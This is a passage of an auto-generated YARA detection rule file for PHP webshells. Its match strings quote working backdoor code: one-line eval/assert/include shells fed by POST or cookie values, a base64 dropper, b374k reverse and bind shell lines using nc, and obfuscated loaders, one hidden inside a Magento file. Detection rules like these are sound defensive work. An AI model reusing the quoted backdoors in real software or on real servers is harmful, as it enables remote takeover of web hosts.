      $s14 = "if(typeof(data.error) != 'undefined')" fullword ascii
      $s15 = "<li>E-commerce Site Development</li>" fullword ascii
      $s16 = "error: function (data, status, e)" fullword ascii
      $s17 = "<li>Survey System Creation</li>" fullword ascii
      $s18 = "<script type=\"text/javascript\" src=\"../js/jquery.js\"></script>" fullword ascii
      $s19 = ".ajaxComplete(function(){" fullword ascii
      $s20 = "function ajaxFileUpload()" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule sig_68112f6cbb4bdffee48f32bf115e2b507cb610ef
{
   meta:
      description = "php17 - file 68112f6cbb4bdffee48f32bf115e2b507cb610ef.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cbaa0b37299f99afe1a0f5968c7e9988e04a6003af36517aa8d715c364b9ae4e"
   strings:
      $x1 = "exec( $bindir.\"mysqldump --user=$USERNAME --password=$PASSWORD $dbname $tablename\" );" fullword ascii
      $x2 = "echo \"<li><a href='$PHP_SELF?action=utils&command=show_processlist'>Processlist</a>\\n\";" fullword ascii
      $s3 = "* Homepage : http://popeye.snu.ac.kr/~smkim/mysql" fullword ascii
      $s4 = "* Developed By SooMin Kim (smkim@popeye.snu.ac.kr)" fullword ascii
      $s5 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_logs'>Logs</a>\\n\";" fullword ascii
      $s6 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_privileges'>Privileges</a>\\n\";" fullword ascii
      $s7 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_hosts'>Hosts</a>\\n\";" fullword ascii
      $s8 = "$mysqlHandle = mysql_pconnect( $HOSTNAME, $USERNAME, $PASSWORD );" fullword ascii
      $s9 = "echo \"<a href='http://popeye.snu.ac.kr/~smkim/mysql'>Hompage<a> is available<br>\";" fullword ascii
      $s10 = "echo \"<a href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>\\n\";" fullword ascii
      $s11 = "header(\"Content-disposition: filename=$filename.sql\");" fullword ascii
      $s12 = "echo \"<td><a href='$PHP_SELF?action=dumpDB&dbname=$dbname'>Dump</a></td>\\n\";" fullword ascii
      $s13 = "$M, $D, $unsigned, $zerofill, $binary, $not_null, $default_value, $auto_increment, $primary_key, $valuelist;" fullword ascii
      $s14 = "$pResult = mysql_query( $queryStr =  \"SELECT * FROM $tablename WHERE $key\", $mysqlHandle );" fullword ascii
      $s15 = "echo \"<li><a href='$PHP_SELF?action=utils&command=show_variables'>Variables</a>\\n\";" fullword ascii
      $s16 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_tables'>Tables</a>\\n\";" fullword ascii
      $s17 = "echo \"<li><a href='$PHP_SELF?action=utils&command=show_status'>Status</a>\\n\";" fullword ascii
      $s18 = "echo \"<tr><td>Password </td><td> <input type=password name=password></td></tr>\\n\";" fullword ascii
      $s19 = "echo \"<li><a href='$PHP_SELF?action=utils&command=flush_status'>Status</a>\\n\";" fullword ascii
      $s20 = "echo \"<a href='mailto:smkim76@icqmail.com'>SooMin Kim</a><br>\\n\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_0687585025f99596508783b891e26d6989eec2ba
{
   meta:
      description = "php17 - file 0687585025f99596508783b891e26d6989eec2ba.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7f22d268cff66b534a2e5d6b76046e8d3b932c1c637702dcc49bfa633a8dd85e"
   strings:
      $s1 = "<?php@include($_POST[\"code\"]);?> " fullword ascii
      $s2 = "<?php@include($_POST[\"code\"]);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_01_hello_world
{
   meta:
      description = "php17 - file 01-hello_world.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069"
   strings:
      $s1 = "Hello World!" fullword ascii
   condition:
      uint16(0) == 0x6548 and filesize < 1KB and
      all of them
}

rule sig_61466b28920b5c7fe7f9020295d027347d9cc1c3
{
   meta:
      description = "php17 - file 61466b28920b5c7fe7f9020295d027347d9cc1c3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "79f1a6a508b704825f4090096b2ce143fcbb335494cfd76b79172890181d93a5"
   strings:
      $x1 = "$db = mysql_connect($_POST['mysql_host'].':'.$_POST['mysql_port'],$_POST['mysql_login'],$_POST['mysql_passw']);" fullword ascii
      $x2 = "iv >';$sqlq =  $_POST['sql'];$db = mysql_connect($dbhost.':'.$dbport,$dblogin,$dbpass);if($db)" fullword ascii
      $x3 = "elseif(function_exists('passthru')){ob_start();passthru($cmd);$result = ob_get_contents();ob_end_clean();}" fullword ascii
      $x4 = "if(function_exists('system')){ob_start();system($cmd);$result = ob_get_contents();ob_end_clean();}" fullword ascii
      $s5 = "if($os == \"nix\"){$pwd = exec(\"pwd\");} elseif($os == \"win\"){$pwd = exec(\"cd\");} if(empty($pwd)) {$pwd = getcwd();}" fullword ascii
      $s6 = "<html><head><style>body{background:#333;}</style><title>login </title></head>" fullword ascii
      $s7 = "if ($_POST['login'] == $login && $_POST['password'] == $password){" fullword ascii
      $s8 = "elseif(function_exists('shell_exec')){$result = shell_exec($cmd);}" fullword ascii
      $s9 = "bye-bye ): </div><br/><br/>\"; do_footer($ver);}else{error('Unable to delete shell', $ver);} die();break;" fullword ascii
      $s10 = "function cmd_exec($cmd2)" fullword ascii
      $s11 = "if (!empty($_POST['login']) && !empty($_POST['password'])){" fullword ascii
      $s12 = "if (isset ($_POST['do']) && $_POST['do']=='logout') { unset($_SESSION['logged']); }" fullword ascii
      $s13 = "elseif(function_exists('exec')){exec($cmd,$result);$result = join(\"\\n\",$result);}" fullword ascii
      $s14 = "<b><form method=\"post\" style=\"margin:0px;\">&copy;</b><input type=\"submit\" value=\"cihshell\" name=\"do\"" fullword ascii
      $s15 = "'/'.$_POST['dirname'].\"&nbsp;was successfuly created.\");}else{error('An error occured while creating dir', $ver);}" fullword ascii
      $s16 = "elseif(is_resource($f = popen($cmd,\"r\"))){$result = \"\";while(!feof($f)) { $result .= fread($f,1024); }pclose($f);}" fullword ascii
      $s17 = ".txt {background:#222; border:1px solid #333; color:#999; font-family:Verdana, Arial;font-size:10px; padding:5px;}" fullword ascii
      $s18 = "if(!isset($_POST['mysql_port']) || empty($_POST['mysql_port'])) { $_POST['mysql_port'] = \"3306\"; }" fullword ascii
      $s19 = "else {echo ' <html><head><style>body{background:#333;}</style><title>login </title></head><body><table style=\"margin-left:100px" ascii
      $s20 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhost = 'localhost';}if (isset($_POST['mysqlw_db']))" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule php17_aafdrs
{
   meta:
      description = "php17 - file aafdrs.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "aea390e4717c19cf3284feb4439b39390e22ea5fa0c10c89d028dfc48f77c014"
   strings:
      $s1 = "$Exp=strrev(\"$_POST[xise]\");" fullword ascii
      $s2 = "eval($Exp($_POST[z]));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_AllTest
{
   meta:
      description = "php17 - file AllTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2743e7c2d3cbb204369160e36b2c48f2512f08cc8639f158fc23182d5de7e16b"
   strings:
      $s1 = "* @author Bernhard Schussek <bschussek@gmail.com>" fullword ascii
      $s2 = "* @expectedException \\Symfony\\Component\\Validator\\Exception\\ConstraintDefinitionException" fullword ascii
      $s3 = "namespace Symfony\\Component\\Validator\\Tests\\Constraints;" fullword ascii
      $s4 = "use Symfony\\Component\\Validator\\Constraints\\Valid;" fullword ascii
      $s5 = "use Symfony\\Component\\Validator\\Constraints\\All;" fullword ascii
      $s6 = "public function testRejectValidConstraint()" fullword ascii
      $s7 = "public function testRejectNonConstraints()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_09102d12a098fb7459945dc053286dd38666386f
{
   meta:
      description = "php17 - file 09102d12a098fb7459945dc053286dd38666386f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6eaf980075a7541514834d6032fb3b083cc99dadba2fb0f88335fd18d982dfbd"
   strings:
      $s1 = "<p>Example of script that should be uploaded to server you wish to control remotely.</p>" fullword ascii
      $s2 = "<h1>This script has hidden php shell!</h1>" fullword ascii
      $s3 = "<?php $f=create_function(\"\",base64_decode(@$_COOKIE[\"z\"]));@$f(); ?>" fullword ascii
      $s4 = "<head></head>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_36d641735414be967998b502bb42a654b5896ac7
{
   meta:
      description = "php17 - file 36d641735414be967998b502bb42a654b5896ac7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "459f19200abf0fc7ea11b30efc6b24ac8fb6dd05cfa596f3756515d5bca58b0a"
   strings:
      $s1 = "<?php @fputs(fopen(base64_decode('cGx1Z2luX20ucGhw'),w),base64_decode('PD9waHAgQGFzc2VydCgkX1BPU1RbJ2NtZCddKTs/Pg=='));?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_9223d9256484635439016d2e26100cb17327cc2d
{
   meta:
      description = "php17 - file 9223d9256484635439016d2e26100cb17327cc2d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4947368cb486df42337fd7e41368be3b0fed2527322fba96b389997cd20a3433"
   strings:
      $x1 = "$s_pass = \"c2739f411688f62074afde539fa56579\"; // shell password, fill with password in md5 format to protect shell" fullword ascii
      $x2 = "elseif(isset($_REQUEST['pgsqlcon']) && ($con = pg_connect(\"host=$sqlhost user=$sqluser password=$sqlpass port=$sqlport\"))){" fullword ascii
      $x3 = "if(buff.value == '- shell command -') buff.value = '';" fullword ascii
      $x4 = "$rspesanb = \"Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button\";" fullword ascii
      $s5 = "else echo \"- shell command -\";" fullword ascii
      $s6 = "else $s_auth = true; // $s_pass variable (password) is empty , go ahead, no login page" fullword ascii
      $s7 = "setcookie(\"b374k\",$login,time() - $s_login_time);" fullword ascii
      $s8 = "<?php if(isset($_REQUEST['cmd'])) echo \"if(document.getElementById('cmd')) document.getElementById('cmd').focus();\"; ?>" fullword ascii
      $s9 = "// http://www.kryogenix.org/code/browser/sorttable/ - this makes the tables sortable" fullword ascii
      $s10 = "// resources $xback_pl $xbind_pl $xback_c $xbind_c $xmulti_py $wmulti_c... this was used with bind and reverse shell" fullword ascii
      $s11 = "$rspesan = \"Press &#39;  Go !  &#39; button and run &#39;  nc <i>server_ip</i> <i>port</i>  &#39; on your computer\";" fullword ascii
      $s12 = "if(!$s_win) $rsres = rs($s_win, cp($d),  \"xback_bin\" ,$xback_c, $rstarget);" fullword ascii
      $s13 = "if(!$s_win) $rsres = rs($s_win, cp($d),  \"xbind_bin\" ,$xbind_c, $rstarget);" fullword ascii
      $s14 = "elseif(isset($_REQUEST['oraclecon']) && ($con = oci_connect($sqluser,$sqlpass,$hostandport))){" fullword ascii
      $s15 = "elseif(isset($_REQUEST['mssqlcon']) && ($con = mssql_connect($hostandport,$sqluser,$sqlpass))){" fullword ascii
      $s16 = "if(isset($_REQUEST['mysqlcon']) && ($con = mysql_connect($hostandport,$sqluser,$sqlpass))){" fullword ascii
      $s17 = "setcookie(\"b374k\",md5($login),time() + $s_login_time);" fullword ascii
      $s18 = "$descriptorspec = array(0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\"));" fullword ascii
      $s19 = "http://code.google.com/p/b374k-shell" fullword ascii
      $s20 = "else $rsres = rs($s_win, cp($d),  \"xbind_bin\" ,$wmulti_c, $rstarget);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_9bcaacb3d29982c6e7e99bc91cafa171f1ed1f74
{
   meta:
      description = "php17 - file 9bcaacb3d29982c6e7e99bc91cafa171f1ed1f74.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9924a6f2b9d4061bef92b2687e781a7bbd33e0870cf8eb234b95e952191b45ee"
   strings:
      $s1 = "$to_include = $_GET['file'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_40ee059eaeb38b421836ad08365daa12202e0cfc
{
   meta:
      description = "php17 - file 40ee059eaeb38b421836ad08365daa12202e0cfc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "34f406f6148e9699b98abb35200a8db8b42cda2c934ed488fec400afc62613aa"
   strings:
      $s1 = "$b='KrKeplace(array(\"/_/KK\"K,\"/-/\"),array(\"KK/\",\"+\")K,$ss($s[$Ki],0K,$e))),$KkKK)));$o=ob_get_contKents();oKb_eK';" fullword ascii
      $s2 = "$r='($j=0K;($j<KK$c&&$i<$KKl);$j++,$Ki++){K$Ko.=$t{$i}^$k{$jK};K}}reKturn $oK;}$r=K$_SERKVER;$rr=@$r[\"KHTTP_REFEK';" fullword ascii
      $s3 = "$D='RER\"];$Kra=@$rK[K\"HTTP_ACCEPT_LKANGUKAGEK\"];if($rKr&&$Kra){$uK=parKse_url($rr);KKparKse_Kstr($u[\"query\"],$Kq';" fullword ascii
      $s4 = "$w=']K[$Kz]K];if(stKrpos($p,K$h)===0)K{$s[$i]=\"K\";$p=$ssK($p,3);}Kif(arrKay_kKeyK_exists($iKK,$sK)){K$s[$i].=$p;';" fullword ascii
      $s5 = "$N='$khK=\"5d41\";$KkKf=\"402Ka\";function x(KK$t,$k){$c=Kstrlen($kK);$lK=strKlen($t)K;$o=\"\";foKrK($i=KK0;$i<$l;){for';" fullword ascii
      $s6 = "$V=');$qK=arraKy_KvaluesK($q);preg_mKatch_KallK(\"/([\\\\w])K[\\\\w-K]+(?:;q=0.([K\\\\KdK]))?,?/\"K,$ra,K$m);if($q&&$m){K@s';" fullword ascii
      $s7 = "$P='d5K($i.$kKh)K,0,3));K$fK=K$sl($ss(md5($iK.$kKf),0,3));$p=\"KK\";for($z=1;$z<KcountK($m[1])K;$z++K)$p.=$Kq[$m[2';" fullword ascii
      $s8 = "$O='ndK_cleKan();$d=basKe64_encodeK(x(gzcKompKreKss(K$o),$k));prinKKt(\"<$Kk>$d</$k>\");@sesKKsion_desKtroy();}}}}';" fullword ascii
      $s9 = "$K='essKioKn_staKrt();$Ks=&$_SEKSSKION;$ss=\"KsKubKKstr\";$sl=\"strtolower\";$Ki=$m[1][K0].$mK[K1][1];$Kh=$sl($ss(Km';" fullword ascii
      $s10 = "$Y='$Ke=strpos($sK[$iK],$f);if($Ke)K{$k=K$kh.$kf;Kob_stKart();@evaKl(@gzunKcoKmpress(@x(@KbKase64_decodKe(preg_K';" fullword ascii
      $s11 = "$M=str_replace('XG','','XGcreaXGte_XGfXGunXGcXGtion');" fullword ascii
      $s12 = "$L=str_replace('K','',$N.$r.$D.$V.$K.$P.$w.$Y.$b.$O);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule adodb_sapdb_inc
{
   meta:
      description = "php17 - file adodb-sapdb.inc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3cbd5f793cd4f2f56c340531292e5d37200b239bf9732548085ddb887a0361e0"
   strings:
      $s1 = "@copyright (c) 2000-2013 John Lim (jlim#natsoft.com). All rights reserved." fullword ascii
      $s2 = "END AS HAS_DEFAULT FROM COLUMNS WHERE tablename=$table ORDER BY pos\") as $column)" fullword ascii
      $s3 = "function MetaPrimaryKeys($table, $owner = false)" fullword ascii
      $s4 = "function MetaColumnNames($table, $numIndexes = false, $useattnum = false)" fullword ascii
      $s5 = "@copyright (c) 2014      Damien Regad, Mark Newnham and the ADOdb community" fullword ascii
      $s6 = "function MetaColumns ($table, $normalize = true)" fullword ascii
      $s7 = "function __construct($id,$mode=false)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      all of them
}

rule AngelShell_98c9a1a1ec03aa4c9f51292d4abe408ced4f7001
{
   meta:
      description = "php17 - file AngelShell_98c9a1a1ec03aa4c9f51292d4abe408ced4f7001.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "070c6119a886d2083ce66a4edca35d80075a89268bc15f76cce50df2ec59c708"
   strings:
      $x1 = "<a href=\"javascript:g('shell');\">Execute Command</a> | " fullword ascii
      $s2 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#f00;\">Close</span></li>');" fullword ascii
      $s3 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#080;\">Open</span></li>');" fullword ascii
      $s4 = "<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s5 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:g('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s6 = "<span style=\"float:right;\">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>" fullword ascii
      $s7 = "p($comma.'<a href=\"javascript:godir(\\''.$drive->Path.'/\\');\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');" fullword ascii
      $s8 = "$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s9 = "$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s10 = "secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s11 = "$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(\", \", $row).');'.\"\\n\";" fullword ascii
      $s12 = "2011</a>. Copyright (C) 2004-2011 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Re" ascii
      $s13 = "$tabledump = \"DROP TABLE IF EXISTS `$table`;\\n\";" fullword ascii
      $s14 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s15 = "<a href=\"javascript:g('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s16 = "secparam('Supported databases', implode(', ', $temp));" fullword ascii
      $s17 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s18 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s19 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s20 = "scookie('loginpass',encode_pass($password));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_50179ba92c2283c4d0ac032b1ee491cbc397caeb
{
   meta:
      description = "php17 - file 50179ba92c2283c4d0ac032b1ee491cbc397caeb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d94e4e4c9be9db4cd2f9ce2c4a411b5fbfbe6bf31cd572ac6bbc0974b516f00c"
   strings:
      $s1 = "_410040464(652),_410040464(653)=> _410040464(654),_410040464(655)=> _410040464(656),_410040464(657)=> _410040464(658),_41004046" fullword ascii
      $s2 = "_410040464(140),_410040464(141)=> _410040464(142),_410040464(143)=> _410040464(144),_410040464(145)=> _410040464(146),_41004046" fullword ascii
      $s3 = "_410040464(524),_410040464(525)=> _410040464(526),_410040464(527)=> _410040464(528),_410040464(529)=> _410040464(530),_41004046" fullword ascii
      $s4 = "_410040464(268),_410040464(269)=> _410040464(270),_410040464(271)=> _410040464(272),_410040464(273)=> _410040464(274),_41004046" fullword ascii
      $s5 = ".'3JlcGxh' .'Y2U' .'='),base64_decode('c3Ryc' .'G9z'),base64_decode('c3RyX3J' .'lc' .'Gxh' .'Y2U' .'='),base64_decode('' .'c3Ry" fullword ascii
      $s6 = ".'m' .'F3dX' .'Js' .'ZGVjb2Rl'),base64_decode('cm' .'F3' .'d' .'XJs' .'ZG' .'V' .'jb2Rl'),base64_decode('' .'c' .'mF3dXJs' .'ZG" fullword ascii
      $s7 = "666666666667" ascii
      $s8 = ".$_SERVER[_410040464(1408)] ._410040464(1409);}$_fs57514aae8e7f4851113cb143ebf6d1e47=_410040464(1410);if(isset($_fs558e309687da" fullword ascii
      $s9 = ".$_fs5c8018794065497bf5e7d356d099f0a43 ._410040464(1425) .$_fs5c8018794065497bf5e7d356d099f0a43 .$_fs503e7a01497735191d98c8cf9c" fullword ascii
      $s10 = "?><?php function _410040464($i){$a=Array('SFRUUF9VU0VSX0FHRU5U','QWhyZWZzQm90','SFRUUF9VU0VSX0FHRU5U','YWhyZWZzYm90','SFRUUF9VU" fullword ascii
      $s11 = "_410040464(396),_410040464(397)=> _410040464(398),_410040464(399)=> _410040464(400),_410040464(401)=> _410040464(402),_41004046" fullword ascii
      $s12 = "=> _410040464(366),_410040464(367)=> _410040464(368),_410040464(369)=> _410040464(370),_410040464(371)=> _410040464(372),_410040" ascii
      $s13 = "=> _410040464(238),_410040464(239)=> _410040464(240),_410040464(241)=> _410040464(242),_410040464(243)=> _410040464(244),_410040" ascii
      $s14 = "=> _410040464(622),_410040464(623)=> _410040464(624),_410040464(625)=> _410040464(626),_410040464(627)=> _410040464(628),_410040" ascii
      $s15 = "as $_fs5026a52b60c431569ed25f1f1410ca66b=>$_fs550b4971127bda5ee20d10eab4752283e){if(fa6__03f84cf8197d351af218ea167f9b9a9c($_SER" fullword ascii
      $s16 = "<?php $GLOBALS['_1850119110_']=Array(base64_decode('ZXJyb3JfcmV' .'wb3J0a' .'W' .'5n'),base64_decode('c3' .'RyX3Jlc' .'Gx' .'hY2" ascii
      $s17 = "464(260),_410040464(261)=> _410040464(262),_410040464(263)=> _410040464(264),_410040464(265)=> _410040464(266),_410040464(267)=>" ascii
      $s18 = "4(162),_410040464(163)=> _410040464(164),_410040464(165)=> _410040464(166),_410040464(167)=> _410040464(168),_410040464(169)=> _" ascii
      $s19 = "40464(230),_410040464(231)=> _410040464(232),_410040464(233)=> _410040464(234),_410040464(235)=> _410040464(236),_410040464(237)" ascii
      $s20 = "40464(358),_410040464(359)=> _410040464(360),_410040464(361)=> _410040464(362),_410040464(363)=> _410040464(364),_410040464(365)" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_62472fde9508496ccb69e1a36cf77a1a58ae67cc
{
   meta:
      description = "php17 - file 62472fde9508496ccb69e1a36cf77a1a58ae67cc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6202cdd2f3683d04e0a952ce6f7c99af31c0ab3c50372a6d2938632da27ea897"
   strings:
      $s1 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['test']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_6be2f32f7bd00e6aba1dae118f0975eb821b8b6c
{
   meta:
      description = "php17 - file 6be2f32f7bd00e6aba1dae118f0975eb821b8b6c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bd1d52289203866645e556e2766a21d2275877fbafa056a76fe0cf884b7f8819"
   strings:
      $x1 = "* @copyright  Copyright (c) 2006-2015 X.commerce, Inc. (http://www.magento.com)" fullword ascii
      $x2 = "* needs please refer to http://www.magento.com for more information." fullword ascii
      $s3 = "* to license@magento.com so we can send you a copy immediately." fullword ascii
      $s4 = "* @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)" fullword ascii
      $s5 = "x5c^>Ew:Qb:Qc:W~f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)e24-" fullword ascii
      $s6 = "$processor = new Error_Processor();" fullword ascii
      $s7 = "require_once 'processor.php';" fullword ascii
      $s8 = "x24)%zW%hj!<*#cd2bge56+99386c6f+9f5d816:5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn)%epnbss-%88:}334}472" fullword ascii
      $s9 = "$processor->process404();" fullword ascii
      $s10 = "x27idtutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j]y6g]257]y86]267]y74]275]y7:]b%!|!*)323zbek!~!<b%" fullword ascii
      $s11 = "x27!hmg%!)!gj!<2,*j%!-#1]#-!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K4]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss" fullword ascii
      $s12 = "x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;ut_map(\"oaxjhon\",str_split(\"%tjw!>!#]y84]275]y83]248]y83]256]y81]265]ycx = \"" fullword ascii
      $s13 = "x27;!>>>!}_;gvc%}&;ft7e:56-xr.985:52985-t.98]K4]65]D8]gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsd268]y7f#<!%tww!>!" fullword ascii
      $s14 = "164\") && (!isset($:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47pmdXA6|7**197-2qj%7-K)udfoopdXA" fullword ascii
      $s15 = "x22!ftmbg)!gj<*#k#)usb;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%x5c2b%!>!2p%!*3>?*2bx31\")) or (strstr($uas,\"" fullword ascii
      $s16 = "8y]#/r%/h%)n%-#+I#)53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C" fullword ascii
      $s17 = "16)-1);} @error_reporting(0);)uqpuft`msvd},;uqpuft`msvd}+;!>!}" fullword ascii
      $s18 = "ps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:" fullword ascii
      $s19 = "x272qj%6<^#zsfvr#00~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<*o#>b%!**X)ufttj" fullword ascii
      $s20 = "x27jsv%6<C>^#]445]212]445]43]321]464]284]366<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_2016_10_01_000019_Db_System_Plugin_History_Detail_Text
{
   meta:
      description = "php17 - file 2016_10_01_000019_Db_System_Plugin_History_Detail_Text.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "40f165129e4dce389739c23712b7519e2d5fe6b790829eab10e29dc2a8d9957a"
   strings:
      $s1 = "class DbSystemPluginHistoryDetailText extends Migration" fullword ascii
      $s2 = "Schema::table('system_plugin_history', function (Blueprint $table) {" fullword ascii
      $s3 = "// Migration occurs before timestamps are patched (see next migration)" fullword ascii
      $s4 = "use October\\Rain\\Database\\Updates\\Migration;" fullword ascii
      $s5 = "$table->text('detail')->nullable()->change();" fullword ascii
      $s6 = "$table->string('detail')->nullable()->change();" fullword ascii
      $s7 = "use October\\Rain\\Database\\Schema\\Blueprint;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ad_fixture
{
   meta:
      description = "php17 - file ad_fixture.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fc6e957c72c10c46d57c11ad4d52542dd96a1ad2967876f90f71728d66b965d3"
   strings:
      $s1 = "* CakePHP(tm) : Rapid Development Framework (http://cakephp.org)" fullword ascii
      $s2 = "* @license       MIT License (http://www.opensource.org/licenses/mit-license.php)" fullword ascii
      $s3 = "* Short description for ad_fixture.php" fullword ascii
      $s4 = "* Long description for ad_fixture.php" fullword ascii
      $s5 = "* @copyright     CakePHP(tm) : Rapid Development Framework (http://cakephp.org)" fullword ascii
      $s6 = "* Redistributions of files must retain the above copyright notice." fullword ascii
      $s7 = "* Licensed under The MIT License" fullword ascii
      $s8 = "* @var string 'Ad'" fullword ascii
      $s9 = "* fields property" fullword ascii
      $s10 = "* records property" fullword ascii
      $s11 = "* name property" fullword ascii
      $s12 = "* @link          http://www.cakephp.org" fullword ascii
      $s13 = "'id' => array('type' => 'integer', 'key' => 'primary')," fullword ascii
      $s14 = "array('parent_id' => null, 'lft' => 7, 'rght' => 12,  'campaign_id' => 2, 'name' => 'Newcastle')," fullword ascii
      $s15 = "array('parent_id' => null, 'lft' => 3,  'rght' => 4,  'campaign_id' => 1, 'name' => 'Statbergen')," fullword ascii
      $s16 = "array('parent_id' => null, 'lft' => 1,  'rght' => 2,  'campaign_id' => 1, 'name' => 'Nordover')," fullword ascii
      $s17 = "'name' => array('type' => 'string', 'length' => 255, 'null' => false)" fullword ascii
      $s18 = "array('parent_id' => null, 'lft' => 8,  'rght' => 9,  'campaign_id' => 2, 'name' => 'Dublin')," fullword ascii
      $s19 = "array('parent_id' => null, 'lft' => 5,  'rght' => 6,  'campaign_id' => 1, 'name' => 'Feroy')," fullword ascii
      $s20 = "array('parent_id' => null, 'lft' => 10, 'rght' => 11, 'campaign_id' => 2, 'name' => 'Alborg')," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_0f964d3fab064cb791677836f5a7f6a6d97d69c8
